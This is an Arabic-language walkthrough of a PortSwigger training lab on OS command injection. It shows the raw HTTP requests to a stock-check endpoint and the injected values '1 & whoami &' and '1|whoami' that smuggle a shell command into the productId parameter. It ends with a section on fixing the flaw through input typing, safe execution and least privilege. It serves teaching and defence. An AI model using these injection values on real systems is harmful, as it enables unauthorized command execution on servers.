# [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

## **`الهدف`**
قم بتنفيذ الأمر `whoami` على السيرفر لتحديد اسم المستخدم الحالي.
## **`خطوات الحل`**
بعد الدخول إلى اللاب سنتوجه إلى أى منتج ونقوم بالضغط على `Check stock` وبعد ذلك سنجد في الـ `HTTP history` الـطلب التالي فسنقوم بتحويله إلى `Repeater`
```http
POST /product/stock HTTP/2
Host: 0a220017038336a1820842c7002d005b.web-security-academy.net
Cookie: session=PrpNNkZ9ZdKDf0QtVagXe0xoKrWMzw7g

productId=1&storeId=1
```

ثم سنقوم بحقن الأمر : `1 & whoami &` أو `1|whoami` داخل `productId` أو `storeID` من داخل `Inspector`

ثم سنقوم بإرسال الطلب لننتهي من حل اللاب
```http
POST /product/stock HTTP/2
Host: 0a220017038336a1820842c7002d005b.web-security-academy.net
Cookie: session=PrpNNkZ9ZdKDf0QtVagXe0xoKrWMzw7g

productId=1%20%26%20whoami%20%26&storeId=1
```
## **`ترقيع الثغرة`**
يجب التحقق من نوع مدخلات المستخدم `Type Validation` وتنقيتها قبل تمريرها أو استخدامها فبما أن المعلمات `Parameters` المطلوبة فعلياً لجلب المخزون مثل `productId` و `storeId` من المفترض أن تكون أرقاماً صحيحة `Integers` فقط، فيجب على التطبيق تحويل هذه المدخلات برمجياً إلى أرقام `Type Casting` بمجرد استخراجها.

ويجب عدم استدعاء أوامر النظام `OS Commands` من داخل التطبيق إلا للضرورة القصوى، وبدلًا من تشغيل سكريبت خارجي عبر موجه الأوامر `Shell` للتحقق من المخزون، قم باستخدام الـ `APIs` المدمجة في لغة البرمجة للاتصال بقاعدة البيانات مباشرة والاستعلام عن المخزون.

وإذا كان استدعاء سكريبت أو أمر نظام خارجي أمرًا لا مفر منه، فيجب استخدام دوال تنفيذ آمنة `Safe Execution Functions` تتيح تمرير المدخلات كوسيطات منفصلة `Arguments` في شكل مصفوفة `Array` وليس كجزء من سلسلة نصية واحدة `String Concatenation`، مع التأكد من تعطيل ميزة تشغيل موجه الأوامر `Shell`.

ويجب ألا يعمل تطبيق الويب بصلاحيات مستخدم `Root` ويعمل بصلاحيات مستخدم محدود مثل `www-data` ولا يملك صلاحية قراءة الملفات الحساسة مثل `/etc/shadow` أو مفاتيح `SSH` أو ملفات إعدادات التطبيقات الأخرى، مما يقلل من حجم الضرر لأى ثغرة قد تحدث.
